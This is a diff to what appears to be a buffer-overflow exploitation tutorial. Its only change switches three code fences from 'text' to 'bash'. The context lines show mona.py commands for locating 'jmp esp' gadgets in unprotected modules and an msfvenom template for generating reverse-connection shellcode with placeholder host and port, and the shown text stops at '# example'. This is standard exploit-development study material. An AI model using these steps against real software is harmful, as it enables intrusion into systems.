@@ -21,7 +21,7 @@ Copy the mona.py file into the PyCommands directory of Immunity Debugger \(usual
 
 In Immunity Debugger, type the following to set a working directory for mona.
 
-```text
+```bash
 !mona config -set workingfolder c:\mona\%p
 ```
 
@@ -129,7 +129,7 @@ You can list modules with `!mona modules` command, and find unsecured module.
 
 Then try to find position of `jmp esp` instruction\(`FF E4`\)
 
-```text
+```bash
 !mona jmp -r esp
 !mona jmp -r esp -cpb "\x00"
 !mona find -s "\xff\xe4" -m <unsecure_module>
@@ -139,7 +139,7 @@ Then try to find position of `jmp esp` instruction\(`FF E4`\)
 
 Generating shellcode with msfvenom is easy.
 
-```text
+```bash
 msfvenom -p <payload> LHOST=<lhost> LPORT=<lport> EXITFUNC=thread -f c -a <architecture> -b <bad_bytes>
 
 # example
